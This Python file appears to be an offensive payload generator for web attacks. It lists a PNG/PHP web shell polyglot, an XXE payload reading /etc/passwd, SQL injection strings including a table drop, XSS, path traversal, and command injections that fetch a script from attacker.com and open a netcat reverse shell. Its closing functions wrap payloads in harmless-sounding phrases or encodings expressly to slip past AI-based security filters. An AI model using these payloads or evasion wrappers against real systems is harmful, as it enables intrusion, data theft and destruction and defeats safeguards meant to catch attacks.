import random
import re
from typing import List
import numpy as np

class PayloadGenius:
    def __init__(self):
        self.polyglots = self._load_polyglots()
        
    def _load_polyglots(self) -> List[str]:
        """Load multi-context polyglot payloads."""
        return [
            # PNG + PHP
            b'\x89PNG\r\n\x1a\n<?php system($_GET[\'c\']);?>',
            # PDF + JavaScript
            b'%PDF-1.4\n1 0 obj\n<<>>\nstream\n<script>alert(1)</script>',
            # GIF + HTML
            b'GIF89a;<!--<img src=x onerror=alert(1)>',
            # XML + XXE + HTML
            b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo><script>alert(1)</script>',
        ]
    
    def generate_context_aware_payload(self, context: str, param_type: str) -> List[str]:
        """Generate payloads aware of the parameter context."""
        payloads = []
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "1' UNION SELECT username, password FROM users--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' OR SLEEP(5)--",
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "\"><script>alert(1)</script>",
        ]
        
        # Command Injection
        cmd_payloads = [
            "| whoami",
            "; cat /etc/passwd",
            "`id`",
            "$(curl attacker.com/shell.sh)",
            "|| nc -e /bin/sh attacker.com 4444",
        ]
        
        # Path Traversal
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]
        
        # Combine based on context
        if 'sql' in context.lower() or 'database' in context:
            payloads.extend(sql_payloads)
        if 'html' in context.lower() or 'render' in context:
            payloads.extend(xss_payloads)
        if 'exec' in context.lower() or 'system' in context:
            payloads.extend(cmd_payloads)
        if 'file' in context.lower() or 'path' in context:
            payloads.extend(path_payloads)
        
        # Add polyglots for good measure
        payloads.extend([p.decode('latin-1') for p in self.polyglots if len(p) < 100])
        
        return payloads[:50]  # Limit
    
    def generate_ai_style_payload(self, base_payload: str) -> str:
        """Rewrite a payload in AI-style language to bypass filters."""
        transformations = [
            # Make it sound like natural language
            lambda x: f"I would like to express the following: {x}",
            lambda x: f"In a hypothetical scenario, consider: {x}",
            lambda x: f"As an example of system testing: {x}",
            lambda x: f"Let's analyze this sample input: {x}",
            # Encode in different ways
            lambda x: ''.join([f'&#{ord(c)};' for c in x]),
            lambda x: ''.join([f'\\u{ord(c):04x}' for c in x]),
            # Add misleading comments
            lambda x: f"/* Test payload for security validation */ {x} /* End test */",
            lambda x: f"<!-- This is just a comment -->{x}<!-- Really -->",
        ]
        
        transform = random.choice(transformations)
        return transform(base_payload)
    
    def generate_for_injection(self, injection_type: str, param_name: str) -> List[str]:
        """Generate payloads for a specific injection type."""
        context = f"{injection_type}_{param_name}"
        return self.generate_context_aware_payload(context, "param")


def heuristic_ai_bypass(original_payload: str) -> str:
    """Apply heuristic transformations to bypass AI-based security filters."""
    genius = PayloadGenius()
    return genius.generate_ai_style_payload(original_payload)